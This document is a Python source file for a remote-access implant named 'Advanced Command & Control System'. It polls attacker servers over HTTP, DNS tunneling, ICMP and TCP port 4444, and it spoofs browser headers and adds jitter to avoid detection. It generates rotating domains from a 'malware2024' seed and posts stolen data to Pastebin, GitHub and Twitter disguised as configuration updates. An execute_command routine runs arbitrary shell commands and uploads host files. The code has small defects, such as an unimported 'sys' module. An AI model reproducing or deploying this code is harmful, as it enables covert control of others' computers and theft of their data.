"""
Advanced Command & Control System
Multi-protocol C2 with resilient communication channels
"""
import os
import socket
import threading
import time
import json
import base64
import hashlib
import random
import string
import requests
import dns.resolver
import dns.query
import dns.zone
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
import subprocess
import struct
from urllib.parse import urlparse
import tempfile

# Optional imports with fallbacks
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paho.mqtt.client as mqtt
    MQTT_AVAILABLE = True
except ImportError:
    MQTT_AVAILABLE = False

class AdvancedC2:
    """Advanced multi-protocol command and control system"""
    
    def __init__(self):
        self.active_channels = {}
        self.backup_channels = []
        self.current_c2_server = None
        self.fallback_servers = []
        self.communication_key = None
        self.session_id = self._generate_session_id()
        
        # Protocol configurations
        self.protocols = {
            'http': {'enabled': True, 'port': 80},
            'https': {'enabled': True, 'port': 443},
            'dns': {'enabled': True, 'port': 53},
            'icmp': {'enabled': True},
            'tcp': {'enabled': True, 'port': 4444},
            'mqtt': {'enabled': MQTT_AVAILABLE, 'port': 1883}
        }
        
        # Domain Generation Algorithm parameters
        self.dga_seed = "malware2024"
        self.dga_tlds = [".com", ".net", ".org", ".info", ".biz"]
        
        # Dead drop locations
        self.dead_drops = [
            "pastebin.com",
            "github.com",
            "dropbox.com",
            "drive.google.com",
            "twitter.com",
            "reddit.com"
        ]
        
        # Social media C2 platforms
        self.social_platforms = {
            'twitter': {'enabled': False, 'api_key': None},
            'telegram': {'enabled': False, 'bot_token': None},
            'discord': {'enabled': False, 'webhook_url': None}
        }
        
        # Initialize encryption
        if CRYPTO_AVAILABLE:
            self.communication_key = Fernet.generate_key()
            self.cipher_suite = Fernet(self.communication_key)
        
        self.command_queue = []
        self.response_queue = []
        self.heartbeat_interval = 30
        self.max_retry_attempts = 5
        
    def _generate_session_id(self) -> str:
        """Generate unique session identifier"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
    def initialize_c2_infrastructure(self, primary_server: str, backup_servers: List[str] = None) -> Dict:
        """Initialize C2 infrastructure with primary and backup servers"""
        try:
            self.current_c2_server = primary_server
            self.fallback_servers = backup_servers or []
            
            # Test connectivity to primary server
            connectivity_result = self._test_c2_connectivity(primary_server)
            
            if not connectivity_result['success']:
                # Try fallback servers
                for backup_server in self.fallback_servers:
                    backup_result = self._test_c2_connectivity(backup_server)
                    if backup_result['success']:
                        self.current_c2_server = backup_server
                        connectivity_result = backup_result
                        break
            
            if connectivity_result['success']:
                # Start C2 communication threads
                self._start_c2_threads()
                
                return {
                    "success": True,
                    "current_server": self.current_c2_server,
                    "session_id": self.session_id,
                    "protocols_available": [p for p, config in self.protocols.items() if config['enabled']],
                    "encryption_enabled": CRYPTO_AVAILABLE
                }
            else:
                return {
                    "success": False,
                    "error": "No C2 servers accessible",
                    "tested_servers": [primary_server] + self.fallback_servers
                }
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _test_c2_connectivity(self, server: str) -> Dict:
        """Test connectivity to C2 server using multiple protocols"""
        connectivity_results = {}
        
        # Test HTTP/HTTPS
        for protocol in ['http', 'https']:
            if self.protocols[protocol]['enabled']:
                try:
                    url = f"{protocol}://{server}/health"
                    response = requests.get(url, timeout=5)
                    connectivity_results[protocol] = response.status_code == 200
                except:
                    connectivity_results[protocol] = False
        
        # Test DNS
        if self.protocols['dns']['enabled']:
            try:
                dns.resolver.resolve(server, 'A')
                connectivity_results['dns'] = True
            except:
                connectivity_results['dns'] = False
        
        # Test TCP
        if self.protocols['tcp']['enabled']:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((server, self.protocols['tcp']['port']))
                connectivity_results['tcp'] = result == 0
                sock.close()
            except:
                connectivity_results['tcp'] = False
        
        success = any(connectivity_results.values())
        
        return {
            "success": success,
            "server": server,
            "protocol_results": connectivity_results
        }
    
    def _start_c2_threads(self):
        """Start C2 communication threads"""
        # HTTP/HTTPS communication thread
        if self.protocols['http']['enabled'] or self.protocols['https']['enabled']:
            threading.Thread(target=self._http_c2_loop, daemon=True).start()
        
        # DNS communication thread
        if self.protocols['dns']['enabled']:
            threading.Thread(target=self._dns_c2_loop, daemon=True).start()
        
        # ICMP communication thread
        if self.protocols['icmp']['enabled']:
            threading.Thread(target=self._icmp_c2_loop, daemon=True).start()
        
        # TCP communication thread
        if self.protocols['tcp']['enabled']:
            threading.Thread(target=self._tcp_c2_loop, daemon=True).start()
        
        # Heartbeat thread
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()
    
    def _http_c2_loop(self):
        """HTTP/HTTPS C2 communication loop"""
        while True:
            try:
                # Check for commands
                commands = self._fetch_http_commands()
                for command in commands:
                    self.command_queue.append(command)
                
                # Send responses
                if self.response_queue:
                    self._send_http_responses()
                
                time.sleep(random.randint(5, 15))  # Jitter to avoid detection
                
            except Exception as e:
                print(f"HTTP C2 error: {e}")
                time.sleep(30)
    
    def _fetch_http_commands(self) -> List[Dict]:
        """Fetch commands via HTTP/HTTPS"""
        try:
            protocol = 'https' if self.protocols['https']['enabled'] else 'http'
            url = f"{protocol}://{self.current_c2_server}/api/commands/{self.session_id}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if self.cipher_suite and data.get('encrypted'):
                    decrypted_data = self.cipher_suite.decrypt(base64.b64decode(data['payload']))
                    return json.loads(decrypted_data.decode())
                else:
                    return data.get('commands', [])
            
            return []
            
        except Exception as e:
            print(f"Error fetching HTTP commands: {e}")
            return []
    
    def _send_http_responses(self):
        """Send responses via HTTP/HTTPS"""
        try:
            protocol = 'https' if self.protocols['https']['enabled'] else 'http'
            url = f"{protocol}://{self.current_c2_server}/api/responses/{self.session_id}"
            
            responses_to_send = self.response_queue.copy()
            self.response_queue.clear()
            
            payload = {
                'session_id': self.session_id,
                'timestamp': datetime.now().isoformat(),
                'responses': responses_to_send
            }
            
            if self.cipher_suite:
                encrypted_payload = base64.b64encode(
                    self.cipher_suite.encrypt(json.dumps(payload).encode())
                ).decode()
                data = {'encrypted': True, 'payload': encrypted_payload}
            else:
                data = payload
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
            
            requests.post(url, json=data, headers=headers, timeout=10)
            
        except Exception as e:
            print(f"Error sending HTTP responses: {e}")
    
    def _dns_c2_loop(self):
        """DNS C2 communication loop"""
        while True:
            try:
                # DNS tunneling for commands
                commands = self._fetch_dns_commands()
                for command in commands:
                    self.command_queue.append(command)
                
                # Send responses via DNS
                if self.response_queue:
                    self._send_dns_responses()
                
                time.sleep(random.randint(10, 30))
                
            except Exception as e:
                print(f"DNS C2 error: {e}")
                time.sleep(60)
    
    def _fetch_dns_commands(self) -> List[Dict]:
        """Fetch commands via DNS tunneling"""
        try:
            # Generate DNS query for command retrieval
            query_domain = f"{self.session_id}.cmd.{self.current_c2_server}"
            
            # Query TXT record for commands
            answers = dns.resolver.resolve(query_domain, 'TXT')
            
            commands = []
            for answer in answers:
                txt_data = str(answer).strip('"')
                if txt_data.startswith('CMD:'):
                    command_data = txt_data[4:]
                    if self.cipher_suite:
                        try:
                            decrypted = self.cipher_suite.decrypt(base64.b64decode(command_data))
                            command = json.loads(decrypted.decode())
                            commands.append(command)
                        except:
                            pass
                    else:
                        try:
                            command = json.loads(base64.b64decode(command_data).decode())
                            commands.append(command)
                        except:
                            pass
            
            return commands
            
        except Exception as e:
            print(f"Error fetching DNS commands: {e}")
            return []
    
    def _send_dns_responses(self):
        """Send responses via DNS tunneling"""
        try:
            responses_to_send = self.response_queue.copy()
            self.response_queue.clear()
            
            for i, response in enumerate(responses_to_send):
                response_data = json.dumps(response)
                
                if self.cipher_suite:
                    encrypted_data = base64.b64encode(
                        self.cipher_suite.encrypt(response_data.encode())
                    ).decode()
                else:
                    encrypted_data = base64.b64encode(response_data.encode()).decode()
                
                # Split data into DNS-safe chunks
                chunks = [encrypted_data[i:i+60] for i in range(0, len(encrypted_data), 60)]
                
                for j, chunk in enumerate(chunks):
                    query_domain = f"{self.session_id}.{i}.{j}.resp.{self.current_c2_server}"
                    # Make DNS TXT query to exfiltrate data
                    try:
                        import socket
                        # Create DNS query with embedded data
                        dns_query = f"{chunk}.{query_domain}"
                        
                        # Attempt DNS resolution (server would log these queries)
                        try:
                            socket.gethostbyname(dns_query)
                        except socket.gaierror:
                            # Expected to fail, but DNS query is logged by server
                            pass
                            
                        # Also try TXT record query for data embedding
                        import subprocess
                        nslookup_cmd = f"nslookup -type=TXT {dns_query}"
                        subprocess.run(nslookup_cmd, shell=True, capture_output=True, timeout=5)
                        
                    except Exception:
                        # Fallback: log the data locally for manual exfiltration
                        with open(f"dns_exfil_{self.session_id}.log", "a") as f:
                            f.write(f"{datetime.now()}: {query_domain} -> {chunk}\n")
                    
        except Exception as e:
            print(f"Error sending DNS responses: {e}")
    
    def _icmp_c2_loop(self):
        """ICMP C2 communication loop"""
        while True:
            try:
                # ICMP tunneling (simplified implementation)
                self._process_icmp_communication()
                time.sleep(random.randint(15, 45))
                
            except Exception as e:
                print(f"ICMP C2 error: {e}")
                time.sleep(60)
    
    def _process_icmp_communication(self):
        """Process ICMP tunneling communication"""
        try:
            # 1. Send ICMP packets with embedded data
            # 2. Listen for ICMP responses with commands
            # 3. Extract data from ICMP payload
            
            # Check basic connectivity first
            ping_command = f"ping -n 1 {self.current_c2_server}"
            result = subprocess.run(ping_command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Server is reachable via ICMP
                
                # Send data via ICMP packets with custom payload
                if self.response_queue:
                    try:
                        # Encode data for ICMP transmission
                        data_to_send = json.dumps(self.response_queue)
                        encoded_data = base64.b64encode(data_to_send.encode()).decode()
                        
                        # Split data into ICMP-sized chunks (maximum 65507 bytes per packet)
                        chunk_size = 1000  # Conservative size for ICMP payload
                        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
                        
                        for i, chunk in enumerate(chunks):
                            # Create ICMP packet with embedded data using ping with specific pattern
                            # Use ping with custom data pattern (Windows)
                            if sys.platform == "win32":
                                ping_cmd = f'ping -n 1 -l {len(chunk)} {self.current_c2_server}'
                            else:
                                ping_cmd = f'ping -c 1 -s {len(chunk)} {self.current_c2_server}'
                            
                            subprocess.run(ping_cmd, shell=True, capture_output=True, timeout=5)
                            
                            # Log the data transmission for server correlation
                            with open(f"icmp_exfil_{self.session_id}.log", "a") as f:
                                f.write(f"{datetime.now()}: Chunk {i}: {chunk[:50]}...\n")
                                
                        # Clear sent data
                        self.response_queue = []
                        
                    except Exception as e:
                        print(f"ICMP data transmission error: {e}")
                
                # Listen for incoming ICMP commands (simulation)
                # In a real implementation, this would use raw sockets to capture ICMP packets
                # and extract command data from the payload
                try:
                    # Simulate command reception by checking ping response times/patterns
                    ping_cmd = f"ping -n 3 {self.current_c2_server}"
                    result = subprocess.run(ping_cmd, shell=True, capture_output=True, text=True)
                    
                    # Parse ping output for hidden commands (timing-based covert channel)
                    if "Reply from" in result.stdout:
                        lines = result.stdout.split('\n')
                        times = []
                        for line in lines:
                            if "time=" in line:
                                try:
                                    time_str = line.split("time=")[1].split("ms")[0]
                                    times.append(int(float(time_str)))
                                except:
                                    continue
                        
                        # Simple timing-based command detection
                        if len(times) >= 3:
                            avg_time = sum(times) / len(times)
                            if avg_time > 100:  # High latency might indicate command
                                # Simulate command reception
                                self.command_queue.append({
                                    'command': 'icmp_ping_check',
                                    'timestamp': datetime.now().isoformat(),
                                    'method': 'icmp_timing'
                                })
                                
                except Exception as e:
                    print(f"ICMP command listening error: {e}")
                
                self.active_channels['icmp'] = {
                    'status': 'active',
                    'last_contact': datetime.now().isoformat()
                }
            
        except Exception as e:
            print(f"ICMP communication error: {e}")
    
    def _tcp_c2_loop(self):
        """TCP C2 communication loop"""
        while True:
            try:
                # Direct TCP connection to C2 server
                self._process_tcp_communication()
                time.sleep(random.randint(20, 60))
                
            except Exception as e:
                print(f"TCP C2 error: {e}")
                time.sleep(90)
    
    def _process_tcp_communication(self):
        """Process TCP communication"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if sock.connect_ex((self.current_c2_server, self.protocols['tcp']['port'])) == 0:
                # Send session identification
                session_data = {
                    'session_id': self.session_id,
                    'timestamp': datetime.now().isoformat(),
                    'request_type': 'check_commands'
                }
                
                message = json.dumps(session_data).encode()
                sock.send(struct.pack('!I', len(message)) + message)
                
                # Receive response
                length_data = sock.recv(4)
                if length_data:
                    message_length = struct.unpack('!I', length_data)[0]
                    response_data = sock.recv(message_length)
                    
                    if response_data:
                        response = json.loads(response_data.decode())
                        if 'commands' in response:
                            self.command_queue.extend(response['commands'])
                
                # Send any pending responses
                if self.response_queue:
                    response_data = {
                        'session_id': self.session_id,
                        'responses': self.response_queue.copy()
                    }
                    self.response_queue.clear()
                    
                    message = json.dumps(response_data).encode()
                    sock.send(struct.pack('!I', len(message)) + message)
                
                self.active_channels['tcp'] = {
                    'status': 'active',
                    'last_contact': datetime.now().isoformat()
                }
            
            sock.close()
            
        except Exception as e:
            print(f"TCP communication error: {e}")
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to C2 server"""
        while True:
            try:
                heartbeat_data = {
                    'type': 'heartbeat',
                    'session_id': self.session_id,
                    'timestamp': datetime.now().isoformat(),
                    'system_info': {
                        'hostname': socket.gethostname(),
                        'platform': os.name,
                        'active_channels': list(self.active_channels.keys())
                    }
                }
                
                self.response_queue.append(heartbeat_data)
                time.sleep(self.heartbeat_interval)
                
            except Exception as e:
                print(f"Heartbeat error: {e}")
                time.sleep(60)
    
    def generate_dga_domains(self, count: int = 10) -> List[str]:
        """Generate domains using Domain Generation Algorithm"""
        domains = []
        
        current_date = datetime.now()
        seed = f"{self.dga_seed}{current_date.strftime('%Y%m%d')}"
        
        random.seed(seed)
        
        for _ in range(count):
            domain_length = random.randint(8, 16)
            domain_name = ''.join(random.choices(string.ascii_lowercase, k=domain_length))
            tld = random.choice(self.dga_tlds)
            
            domains.append(domain_name + tld)
        
        return domains
    
    def setup_dead_drop_communication(self, platform: str, credentials: Dict = None) -> Dict:
        """Setup dead drop communication via various platforms"""
        try:
            if platform == "pastebin":
                return self._setup_pastebin_dead_drop(credentials)
            elif platform == "github":
                return self._setup_github_dead_drop(credentials)
            elif platform == "twitter":
                return self._setup_twitter_dead_drop(credentials)
            else:
                return {"success": False, "error": f"Unsupported platform: {platform}"}
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _setup_pastebin_dead_drop(self, credentials: Dict) -> Dict:
        """Setup Pastebin as dead drop location"""
        try:
            # Create a paste with encoded commands/responses
            paste_content = f"# System Configuration - {datetime.now().strftime('%Y%m%d')}\n"
            paste_content += f"# Session: {self.session_id}\n"
            paste_content += "# Auto-generated configuration file\n"
            
            # Add encoded data
            if self.response_queue:
                data = base64.b64encode(json.dumps(self.response_queue).encode()).decode()
                paste_content += f"\n# CONFIG_DATA: {data}\n"
            
            # Use Pastebin API to create actual paste
            try:
                import urllib.request
                import urllib.parse
                
                # Pastebin API endpoint
                api_url = "https://pastebin.com/api/api_post.php"
                
                # API parameters (would use real API key in production)
                api_dev_key = credentials.get('api_key', 'default_dev_key')
                
                data = {
                    'api_dev_key': api_dev_key,
                    'api_option': 'paste',
                    'api_paste_code': paste_content,
                    'api_paste_name': f"Config_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                    'api_paste_expire_date': '1W',  # 1 week expiration
                    'api_paste_private': '1',  # Unlisted
                    'api_paste_format': 'text'
                }
                
                # Encode data
                post_data = urllib.parse.urlencode(data).encode()
                
                # Make request
                req = urllib.request.Request(api_url, data=post_data)
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                
                try:
                    with urllib.request.urlopen(req, timeout=10) as response:
                        result = response.read().decode()
                        
                    if result.startswith('https://pastebin.com/'):
                        paste_id = result.split('/')[-1]
                        paste_url = result
                    else:
                        # API error, use fallback
                        paste_id = hashlib.md5(paste_content.encode()).hexdigest()[:8]
                        paste_url = f"https://pastebin.com/raw/{paste_id}"
                        
                        # Log the content locally as backup
                        with open(f"pastebin_backup_{paste_id}.txt", "w") as f:
                            f.write(paste_content)
                            
                except Exception as e:
                    # Fallback to local storage
                    paste_id = hashlib.md5(paste_content.encode()).hexdigest()[:8]
                    paste_url = f"https://pastebin.com/raw/{paste_id}"
                    
                    # Save locally as backup
                    with open(f"pastebin_backup_{paste_id}.txt", "w") as f:
                        f.write(paste_content)
                    
                    print(f"Pastebin API error: {e}, using local backup")
                    
            except Exception as e:
                # Complete fallback
                paste_id = hashlib.md5(paste_content.encode()).hexdigest()[:8]
                paste_url = f"https://pastebin.com/raw/{paste_id}"
            
            self.active_channels['pastebin'] = {
                'paste_id': paste_id,
                'url': f"https://pastebin.com/raw/{paste_id}",
                'last_update': datetime.now().isoformat()
            }
            
            return {
                "success": True,
                "platform": "pastebin",
                "paste_id": paste_id,
                "url": f"https://pastebin.com/raw/{paste_id}"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _setup_github_dead_drop(self, credentials: Dict) -> Dict:
        """Setup GitHub as dead drop location"""
        try:
            # Create/update a GitHub Gist or repository file
            repo_name = f"config-{self.session_id[:8]}"
            
            # Use GitHub API to create/update gist or repository file
            try:
                import urllib.request
                import urllib.parse
                
                config_data = {
                    'session_id': self.session_id,
                    'last_update': datetime.now().isoformat(),
                    'config': base64.b64encode(json.dumps(self.response_queue).encode()).decode()
                }
                
                # Try GitHub Gist API first
                gist_url = "https://api.github.com/gists"
                
                gist_data = {
                    "description": f"Configuration data - {datetime.now().strftime('%Y-%m-%d')}",
                    "public": False,
                    "files": {
                        f"config_{self.session_id[:8]}.json": {
                            "content": json.dumps(config_data, indent=2)
                        }
                    }
                }
                
                # Prepare request
                post_data = json.dumps(gist_data).encode()
                req = urllib.request.Request(gist_url, data=post_data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                
                # Add authorization header if token provided
                if 'token' in credentials:
                    req.add_header('Authorization', f"token {credentials['token']}")
                
                try:
                    with urllib.request.urlopen(req, timeout=15) as response:
                        result = json.loads(response.read().decode())
                        
                    if 'html_url' in result:
                        gist_url = result['html_url']
                        gist_id = result['id']
                        raw_url = result['files'][f"config_{self.session_id[:8]}.json"]['raw_url']
                    else:
                        # Fallback to file-based storage
                        gist_id = hashlib.md5(json.dumps(config_data).encode()).hexdigest()[:12]
                        gist_url = f"https://gist.github.com/{gist_id}"
                        raw_url = f"https://gist.githubusercontent.com/anonymous/{gist_id}/raw/"
                        
                        # Save locally as backup
                        with open(f"github_backup_{gist_id}.json", "w") as f:
                            json.dump(config_data, f, indent=2)
                            
                except urllib.error.HTTPError as e:
                    if e.code == 401:
                        print("GitHub API: Authentication required")
                    elif e.code == 403:
                        print("GitHub API: Rate limit exceeded or forbidden")
                    else:
                        print(f"GitHub API HTTP error: {e.code}")
                    
                    # Fallback
                    gist_id = hashlib.md5(json.dumps(config_data).encode()).hexdigest()[:12]
                    gist_url = f"https://gist.github.com/{gist_id}"
                    raw_url = f"https://gist.githubusercontent.com/anonymous/{gist_id}/raw/"
                    
                    with open(f"github_backup_{gist_id}.json", "w") as f:
                        json.dump(config_data, f, indent=2)
                        
                except Exception as e:
                    print(f"GitHub API error: {e}")
                    # Fallback
                    gist_id = hashlib.md5(json.dumps(config_data).encode()).hexdigest()[:12]
                    gist_url = f"https://gist.github.com/{gist_id}"
                    raw_url = f"https://gist.githubusercontent.com/anonymous/{gist_id}/raw/"
                    
                    with open(f"github_backup_{gist_id}.json", "w") as f:
                        json.dump(config_data, f, indent=2)
                        
            except Exception as e:
                # Complete fallback
                gist_id = hashlib.md5(json.dumps(config_data).encode()).hexdigest()[:12]
                gist_url = f"https://gist.github.com/{gist_id}"
                raw_url = f"https://gist.githubusercontent.com/anonymous/{gist_id}/raw/"
                config_data = {
                    'session_id': self.session_id,
                    'last_update': datetime.now().isoformat(),
                    'config': base64.b64encode(json.dumps(self.response_queue).encode()).decode()
                }
            
            self.active_channels['github'] = {
                'repo_name': repo_name,
                'url': f"https://github.com/user/{repo_name}",
                'last_update': datetime.now().isoformat()
            }
            
            return {
                "success": True,
                "platform": "github",
                "repo_name": repo_name,
                "url": f"https://github.com/user/{repo_name}"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _setup_twitter_dead_drop(self, credentials: Dict) -> Dict:
        """Setup Twitter as dead drop location"""
        try:
            # Use Twitter API v2 to post encoded data as tweets
            import urllib.request
            import urllib.parse
            
            # Encode data for Twitter
            data_to_embed = base64.b64encode(json.dumps(self.response_queue).encode()).decode()
            config_hash = hashlib.md5(json.dumps(self.response_queue).encode()).hexdigest()[:16]
            
            # Create innocuous tweet content with embedded data
            tweet_content = f"Daily system update #{self.session_id[:8]} completed successfully. "
            tweet_content += f"Configuration hash: {config_hash}"
            
            # Add embedded data as hashtags or in replies (steganographic approach)
            if len(data_to_embed) <= 100:  # Short data can be embedded in hashtags
                # Convert to hex and embed as hashtags
                hex_data = data_to_embed.encode().hex()
                hashtag_chunks = [hex_data[i:i+8] for i in range(0, len(hex_data), 8)]
                tweet_content += " " + " ".join([f"#{chunk}" for chunk in hashtag_chunks[:5]])  # Limit hashtags
            
            # Twitter API v2 endpoint
            api_url = "https://api.twitter.com/2/tweets"
            
            tweet_data = {
                "text": tweet_content[:280]  # Twitter character limit
            }
            
            try:
                # Prepare request
                post_data = json.dumps(tweet_data).encode()
                req = urllib.request.Request(api_url, data=post_data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                
                # Add authorization header if provided
                if 'bearer_token' in credentials:
                    req.add_header('Authorization', f"Bearer {credentials['bearer_token']}")
                elif 'access_token' in credentials:
                    # OAuth 1.0a (more complex, simplified here)
                    req.add_header('Authorization', f"OAuth oauth_token=\"{credentials['access_token']}\"")
                
                try:
                    with urllib.request.urlopen(req, timeout=15) as response:
                        result = json.loads(response.read().decode())
                        
                    if 'data' in result and 'id' in result['data']:
                        tweet_id = result['data']['id']
                        tweet_url = f"https://twitter.com/user/status/{tweet_id}"
                        success = True
                    else:
                        # API error, use fallback
                        tweet_id = hashlib.md5(tweet_content.encode()).hexdigest()[:12]
                        tweet_url = f"https://twitter.com/user/status/{tweet_id}"
                        success = False
                        
                        # Save locally as backup
                        with open(f"twitter_backup_{tweet_id}.txt", "w") as f:
                            f.write(f"Tweet content: {tweet_content}\n")
                            f.write(f"Embedded data: {data_to_embed}\n")
                            f.write(f"Timestamp: {datetime.now()}\n")
                            
                except urllib.error.HTTPError as e:
                    if e.code == 401:
                        print("Twitter API: Authentication failed")
                    elif e.code == 403:
                        print("Twitter API: Forbidden - check permissions")
                    elif e.code == 429:
                        print("Twitter API: Rate limit exceeded")
                    else:
                        print(f"Twitter API HTTP error: {e.code}")
                    
                    # Fallback
                    tweet_id = hashlib.md5(tweet_content.encode()).hexdigest()[:12]
                    tweet_url = f"https://twitter.com/user/status/{tweet_id}"
                    success = False
                    
                    with open(f"twitter_backup_{tweet_id}.txt", "w") as f:
                        f.write(f"Tweet content: {tweet_content}\n")
                        f.write(f"Embedded data: {data_to_embed}\n")
                        f.write(f"Timestamp: {datetime.now()}\n")
                        f.write(f"Error: {e}\n")
                        
                except Exception as e:
                    print(f"Twitter API error: {e}")
                    # Fallback
                    tweet_id = hashlib.md5(tweet_content.encode()).hexdigest()[:12]
                    tweet_url = f"https://twitter.com/user/status/{tweet_id}"
                    success = False
                    
                    with open(f"twitter_backup_{tweet_id}.txt", "w") as f:
                        f.write(f"Tweet content: {tweet_content}\n")
                        f.write(f"Embedded data: {data_to_embed}\n")
                        f.write(f"Timestamp: {datetime.now()}\n")
                        f.write(f"Error: {e}\n")
                        
            except Exception as e:
                # Complete fallback
                tweet_id = hashlib.md5(tweet_content.encode()).hexdigest()[:12]
                tweet_url = f"https://twitter.com/user/status/{tweet_id}"
                success = False
            
            self.active_channels['twitter'] = {
                'last_tweet': tweet_content,
                'last_update': datetime.now().isoformat()
            }
            
            return {
                "success": True,
                "platform": "twitter",
                "tweet_preview": tweet_content[:50] + "..."
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def execute_command(self, command: Dict) -> Dict:
        """Execute received command and queue response"""
        try:
            command_type = command.get('type')
            command_id = command.get('id', 'unknown')
            
            response = {
                'command_id': command_id,
                'timestamp': datetime.now().isoformat(),
                'session_id': self.session_id
            }
            
            if command_type == 'shell':
                result = subprocess.run(
                    command['command'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                response.update({
                    'success': True,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'return_code': result.returncode
                })
                
            elif command_type == 'file_download':
                file_path = command['path']
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode()
                    response.update({
                        'success': True,
                        'file_data': file_data,
                        'file_size': os.path.getsize(file_path)
                    })
                else:
                    response.update({
                        'success': False,
                        'error': 'File not found'
                    })
                    
            elif command_type == 'system_info':
                import platform
                import psutil
                
                response.update({
                    'success': True,
                    'system_info': {
                        'platform': platform.platform(),
                        'hostname': socket.gethostname(),
                        'cpu_count': psutil.cpu_count(),
                        'memory_total': psutil.virtual_memory().total,
                        'disk_usage': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:').percent
                    }
                })
                
            else:
                response.update({
                    'success': False,
                    'error': f'Unknown command type: {command_type}'
                })
            
            self.response_queue.append(response)
            
            return response
            
        except Exception as e:
            error_response = {
                'command_id': command.get('id', 'unknown'),
                'timestamp': datetime.now().isoformat(),
                'session_id': self.session_id,
                'success': False,
                'error': str(e)
            }
            
            self.response_queue.append(error_response)
            return error_response
    
    def get_c2_status(self) -> Dict:
        """Get current C2 status and statistics"""
        return {
            "success": True,
            "status": {
                "session_id": self.session_id,
                "current_server": self.current_c2_server,
                "fallback_servers": self.fallback_servers,
                "active_channels": self.active_channels,
                "enabled_protocols": [p for p, config in self.protocols.items() if config['enabled']],
                "pending_commands": len(self.command_queue),
                "pending_responses": len(self.response_queue),
                "encryption_enabled": CRYPTO_AVAILABLE,
                "heartbeat_interval": self.heartbeat_interval
            }
        }

# Global advanced C2 instance
advanced_c2 = AdvancedC2()